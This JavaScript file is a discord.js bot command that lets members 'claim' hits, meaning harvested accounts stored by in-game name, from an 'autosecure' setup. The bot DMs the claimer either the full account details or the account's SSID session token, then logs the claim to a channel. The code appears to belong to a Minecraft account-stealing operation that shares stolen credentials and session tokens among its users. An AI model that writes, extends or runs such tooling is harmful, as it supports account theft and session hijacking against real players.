const { ApplicationCommandOptionType } = require("discord.js");
const { queryParams } = require("../../../db/db");
const listAccount = require("../../utils/listAccount");
const { claimHitMessager } = require("../../utils/messager");
module.exports = {
  name: "claim",
  description: 'Claim a hit',
  options: [
    {
      name: "ign",
      description: "IGN Of the Account",
      type: ApplicationCommandOptionType.String,
      required: true
    }
  ],
  callback: async (client, interaction) => {
    let user = await queryParams(`SELECT * FROM users WHERE user_id=? AND child=?`, [client.username, interaction.user.id])
    if (interaction.user.id != client.username) {
      if (user.length == 0) {
        return interaction.reply({ content: `You're not a user of this bot.`, ephemeral: true })
      }
      user = user[0]
      if (user.claiming == -1) {
        return interaction.reply({ content: `You don't have permission to claim hits.`, ephemeral: true })
      }
    }
    let settings = await queryParams(`SELECT * FROM autosecure WHERE user_id=?`, [client.username])
    if (settings.length == 0) {
      return interaction.reply({ content: `This server isn't setup properly.`, ephemeral: true })
    }
    settings = settings[0]
    let channelId, guildId = null
    if (settings.logs_channel) {
      [channelId, guildId] = settings.logs_channel.split("|")
    } else {
      return interaction.reply({ content: `Admins need to use /set to configure logs.`, ephemeral: true })
    }
    let name = interaction.options.getString("ign")
    if (!client?.hits?.has(name)) return interaction.reply({ content: `Couldn't find your hit.`, ephemeral: true })
    let data = client.hits.get(name)
    if (user?.claiming == 1 || client.username == interaction.user.id) {
      let msg = await listAccount(data)
      try {
        await interaction.user.send(msg)
        await interaction.reply({ content: `Details sent to your DMs.`, ephemeral: true })
        client.hits.delete(name)
        claimHitMessager(client, guildId, channelId, interaction, 1,name)
      } catch (e) {
        console.log(e)
        return interaction.reply({ content: `Unexpected error occured.`, ephemeral: true })
      }
    } else {
      try {
        if (data.ssid) {
          let msg = {
            embeds: [{
              title: `SSID`,
              description: `SSID \`${data.ssid}\``,
              color: 0x000000 
            }],
            ephemeral: true
          }
          interaction.user.send(msg)
          interaction.reply({ content: `Details sent to your DMs.`, ephemeral: true })
          client.hits.delete(name)
          claimHitMessager(client, guildId, channelId, interaction, 0,name)
        } else {
          return interaction.reply({ content: `This hit doesn't own MC.`, ephemeral: true })
        }
      } catch (e) {
        console.log(e)
        return interaction.reply({ content: `Unexpected error occured.`, ephemeral: true })
      }
    }
  }
}